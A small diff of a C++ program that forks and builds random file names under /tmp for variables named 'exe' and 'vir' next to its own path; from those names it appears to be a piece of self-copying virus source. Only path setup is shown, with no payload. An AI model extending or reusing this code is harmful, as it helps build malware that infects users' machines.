@@ -11,7 +11,7 @@ int main (int argc, char** argv) {
     pid_t childpid = fork();
     srand(time(0));
     int c;
-    string exe = "/tmp/exe", vir = "/tmp/vir", me = (string) argv[0], command;
+    string exe = "/tmp/", vir = "/tmp/", me = (string) argv[0], command;
     for (int i = 0; i < 8; i++) {
         exe += (char) ((rand() % 26) + 65);
         vir += (char) ((rand() % 26) + 65);
